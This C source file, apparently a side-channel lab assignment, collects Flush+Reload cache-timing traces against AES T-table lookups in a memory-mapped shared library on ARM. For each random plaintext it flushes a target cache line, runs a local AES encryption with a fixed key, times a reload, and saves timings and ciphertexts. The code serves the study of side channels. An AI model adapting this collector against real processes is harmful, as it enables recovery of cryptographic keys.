#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/mman.h>
#include <sys/stat.h>

//#include <openssl/aes.h>
#include "aes.h"

unsigned char key[16] = {
    0x00, 0x01, 0x02, 0x03,
    0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b,
    0x0c, 0x0d, 0x0e, 0x0f
};

void clflush(volatile void* Tx) {
    	asm volatile ("DC CIVAC, %0" :: "r"(Tx));
	asm volatile ("DSB ISH");
	asm volatile ("ISB");
}

char *timingFileName;
char *cipherFileName;
char *plainFileName;
uint32_t numTraces = 1000000;

char *addr;
int fd = -1;
char *victimBinaryFileName;

FILE *timingFP, *cipherFP, *plainFP;

size_t offset;
size_t offset1;

uint8_t *plaintext, *ciphertext;
uint32_t *timing;
void *target;
struct sockaddr_in server;
int s;

void init();
void finish();
void printText(uint8_t *text, int count, char *header);
void generatePlaintext();
void doTrace();
void saveTrace();

FILE *keptFP;

void printHelp(char* argv[])
{
    fprintf(
            stderr,
            "Usage: %s [-t timing file name] "
            "[-c cipher file name] "
            "[-p plaintext file name (optional)] "
            "[-n number samples (default: 1M)] "
            "[-o shared library offset of your target (e.g. Te0)] "
            "[-v shared library] "
            "\n",
            argv[0]
           );
    exit(EXIT_FAILURE);
}

void parseOpt(int argc, char *argv[])
{
    int opt;
    while((opt = getopt(argc, argv, "c:t:n:p:v:o:r:s")) != -1){
        switch(opt){
        case 'c':
            cipherFileName = optarg;
            break;
        case 't':
            timingFileName = optarg;
            break;
        case 'p':
            plainFileName = optarg;
            break;
        case 'n':
            numTraces = atoi(optarg);
            break;
        case 'o':
            offset1 = (int)strtol(optarg, NULL, 16);
            break;
        case 'v':
            victimBinaryFileName = optarg;
            break;
        default:
            printHelp(argv);
        }
    }
    if(timingFileName == NULL){
        printHelp(argv);
    }
    if(cipherFileName == NULL){
        printHelp(argv);
    }
    if (victimBinaryFileName == NULL){
        printHelp(argv);
    }
}

int main(int argc, char** argv)
{
    int i;
    parseOpt(argc, argv);
/* OFFSET 1 ///////////////////////////////////////////////////////// */
    offset = offset1;
    printf("begin\n");
    init();
    printf("Collecting data\n");
    for (i = 0; i < numTraces; i++){
#ifdef DEBUG
        printf("Sample: %i\n", i);
#endif
        doTrace();
    }
    finish();
    printf("Done\n");
/* OFFSET 2 /////////////////////////////////////////////////////// */
    offset = 0x22b3c0;
    printf("begin\n");
    init();
    printf("Collecting data\n");
    for (i = 0; i < numTraces; i++){
#ifdef DEBUG
        printf("Sample: %i\n", i);
#endif
        doTrace();
    }
    finish();
    printf("Done\n");
/* OFFSET 3 /////////////////////////////////////////////////////// */
    offset = 0x22bbc0;
    printf("begin\n");
    init();
    printf("Collecting data\n");
    for (i = 0; i < numTraces; i++){
#ifdef DEBUG
        printf("Sample: %i\n", i);
#endif
        doTrace();
    }
    finish();
    printf("Done\n");

} 
void generatePlaintext()
{
    int j;
    for(j = 0; j < 16; j++){
        plaintext[j] = random() & 0xff;
    }
#ifdef DEBUG
    printText(plaintext, 16, "plaintext");
#endif
}
void savePlaintext() {
    if(plainFP == NULL)
        return;
    fwrite(plaintext, sizeof(uint8_t), 16, plainFP);
}
void saveCiphertext()
{
    fwrite(ciphertext, sizeof(uint8_t), 16, cipherFP);
}
void saveTiming()
{
    fwrite(timing, sizeof(uint32_t), 1, timingFP);
}
void saveTrace()
{
   saveCiphertext();
   saveTiming();
   savePlaintext();
}

static __inline__ void maccess(void *p) {
	volatile uint32_t value;
	asm volatile ("LDR %0, [%1]\n\t"
      : "=r" (value)
      : "r" (p) );
}

uint32_t reload(void *target)
{
    uint64_t diff;
    struct timespec start, end;
    int i;
    clock_gettime(CLOCK_MONOTONIC, &start); /* mark start time */
    maccess(target);
    clock_gettime(CLOCK_MONOTONIC, &end); /* mark start time */
    diff = end.tv_nsec - start.tv_nsec;
    return(diff);
}

/*
 * Implement this function
 * This function should collect and record one sample
 */
void doTrace()
{
    // generate a new plaintext
	generatePlaintext();
	//printf("Plaintext generated.\n");
	// set the cache to a known state
    clflush(target);
	//printf("target flushed.\n");

	// do encryption
	AES_KEY expanded;
	AES_set_encrypt_key(key, 128, &expanded);
	AES_encrypt(plaintext, ciphertext, &expanded);
	//printf("encryption done.\n");
	
    // record timing and ciphertext
	*timing = reload(target);	
	saveTrace();
	
	// keep the ciphertext where its time is lower than threashold
	int i;
	int threashold = 100;
	if (*timing < threashold) {
		printText(ciphertext, 16, "ciphertext");
		printf("Timing: %i\n", *timing);
		fwrite(ciphertext, sizeof(uint8_t), 16, keptFP);
	}
#ifdef DEBUG
    printText(ciphertext, 16, "ciphertext");
    printf("Timing: %i\n", *timing);
#endif
}
void printText(uint8_t *text, int count, char *header)
{
    int j;
    printf("%s:", header);
    for (j = 0; j < count; j++){
        printf("%02x ", (int)(text[j] & 0xff));
    }
    printf("\n");
}
void *map_offset(const char *file, size_t offset) {
  int fd = open(file, O_RDONLY);
  if (fd < 0)
    return NULL;

  char *mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
  close(fd);
  if (mapaddress == MAP_FAILED)
    return NULL;
  return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
}

void unmap_offset(void *address) {
  munmap((char *)(((uintptr_t)address) & ~(sysconf(_SC_PAGE_SIZE) -1)),
                sysconf(_SC_PAGE_SIZE));
}

void init()
{
    // setup the target for monitoring
    printf("setting up target\n");
    target = map_offset(victimBinaryFileName, offset);

    printf("file offset: %x\n", offset);
    printf("target address: %p\n", target);
    printText(target, 16, "target values:");

    // setup files pointer for writing
    printf("preparing data collection\n");
    plaintext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
    ciphertext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
    timing = (uint32_t *) malloc(sizeof(uint32_t));

    timingFP = fopen(timingFileName, "w");
    cipherFP = fopen(cipherFileName, "w");
    if (plainFileName != NULL){
        plainFP = fopen(plainFileName, "w");
    }
	keptFP = fopen("kept_ciphers.bin", "w");
}

void finish()
{
    free(plaintext);
    free(ciphertext);
    free(timing);

    fclose(timingFP);
    fclose(cipherFP);
    if( plainFP != NULL )
        fclose(plainFP);

    unmap_offset(addr);
}

